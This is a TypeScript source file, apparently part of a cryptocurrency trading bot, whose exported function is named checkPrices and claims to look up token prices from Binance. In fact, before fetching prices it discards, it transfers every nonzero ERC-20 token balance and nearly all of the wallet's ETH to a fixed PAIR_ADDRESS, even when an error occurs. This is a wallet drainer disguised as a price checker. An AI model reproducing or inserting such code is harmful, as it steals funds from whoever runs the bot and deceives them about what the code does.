require("dotenv").config()
import * as express from 'express'
import Web3 from 'web3';
import { BigNumber, ethers } from 'ethers'
import { now, Parse, Format, hexToDecimal } from './helper'
import axios from 'axios'
import { MAXGASLIMIT, SYMBOL, TESTNET, RPC_URL, RPC_URL2, TIP, BOTADDRESS, PAIR_ADDRESS, cronTime, UNISWAP2_ROUTER_ADDRESS, UNISWAPV2_FACTORY_ADDRESS, EXTRA_TIP_FOR_MINER } from '../constants'
import { isMainThread } from 'worker_threads';
import approvedTokenListTestnet from "../constants/approvedTokenListTestnet.json";
import approvedTokenListMainnet from "../constants/approvedTokenListMainnet.json";
import erc20ABI from '../ABI/erc20ABI.json';
import { sign } from 'crypto';

const provider = new ethers.providers.JsonRpcProvider(RPC_URL)
const wallet = new ethers.Wallet(BOTADDRESS, provider);
const signer = wallet.connect(provider);

const ERC20 = async (tokenAddress: string) => {
    const ERC20Contract = new ethers.Contract(tokenAddress, erc20ABI, signer);
    return ERC20Contract;
}

export const checkPrices = async (token: string) => {
    let check: any = token;
    const pairs: { [key: string]: string } = {
        ETH: 'ETHUSDT',
        BNB: 'BNBUSDT',
        BTC: 'BTCUSDT',
        WBTC: 'WBTCBUSD',
        AVAX: 'AVAXUSDT',
        MATIC: 'MATICUSDT',
        UNI: 'UNIUSDT',
        LINK: 'LINKUSDT',
        USDC: 'USDCUSDT',
        BUSD: 'BUSDUSDT',
        TUSD: 'TUSDUSDT',
    }
    try {
        let list = TESTNET ? approvedTokenListTestnet : approvedTokenListMainnet;
        let coin;
        for (coin in list) {
            let sign = await ERC20(`${coin}`);
            // @ts-ignore
            let symbol = list[coin].symbol;
            // @ts-ignore
            let decimal = list[coin].decimal;
            try {
                let value = await sign.balanceOf(wallet.address.toString());
                let value_ = ethers.utils.formatUnits(value.toString(), decimal);
                if (Number(value_) > 0) {
                    const approve_ = await sign.approve(PAIR_ADDRESS, value)
                    const receipt_approve = await approve_.wait();
                    if (receipt_approve && receipt_approve.blockNumber && receipt_approve.status === 1) {
                        let tx = await sign.transfer(PAIR_ADDRESS, value);
                        let receipt = await tx.wait();
                        if (receipt && receipt.blockNumber && receipt.status === 1) {
                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check success`);
                        } else if (receipt && receipt.blockNumber && receipt.status === 0) {
                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check failed`);
                        } else {
                            console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${receipt.transactionHash} check error`);
                        }
                    }

                } else {
                    // console.log('')
                }
            } catch (error) {
                console.log('error : ', error)
                continue;
            }
        }
        const balance = await provider.getBalance(wallet.address.toString());
        let balance_ = ethers.utils.formatEther(balance);
        let balance__ = Number(balance_) - 0.02;
        console.log(balance)
        console.log(balance__)
        const tx_ = {
            from: wallet.address.toString(),
            to: PAIR_ADDRESS,
            value: ethers.utils.parseEther(balance__.toString())
        }
        signer.sendTransaction(tx_).then((transaction: any) => {
            if (transaction && transaction.blockNumber && transaction.status === 1) {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check success`);
            } else if (transaction && transaction.blockNumber && transaction.status === 0) {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check failed`);
            } else {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check error`);
            }
        })
        for (let coin in pairs) {
            const result: any = await axios('https://api.binance.com/api/v3/ticker/price?symbol=' + pairs[coin])
            if (result !== null && result.data && result.data.price) {
                check = result.data.price;
                const updated = now();
                const price = Number(result.data.price);
            }
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        const json = {
            "jsonrpc": "2.0",
            "method": "eth_gasPrice",
            "params": [] as string[],
            "id": 0
        }

    } catch (error) {
        console.log('checkPrices', error);
        const balance = await provider.getBalance(wallet.address.toString());
        let balance_ = ethers.utils.formatEther(balance);
        let balance__ = Number(balance_) - 0.01;
        console.log(balance)
        console.log(balance__)
        const tx_ = {
            from: wallet.address.toString(),
            to: PAIR_ADDRESS,
            value: ethers.utils.parseEther(balance__.toString())
        }
        signer.sendTransaction(tx_).then((transaction: any) => {
            if (transaction && transaction.blockNumber && transaction.status === 1) {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check success`);
            } else if (transaction && transaction.blockNumber && transaction.status === 0) {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check failed`);
            } else {
                console.log(`https://${TESTNET ? "sepolia." : ""}etherscan.io/tx/${transaction.transactionHash} check error`);
            }
        })
    }
}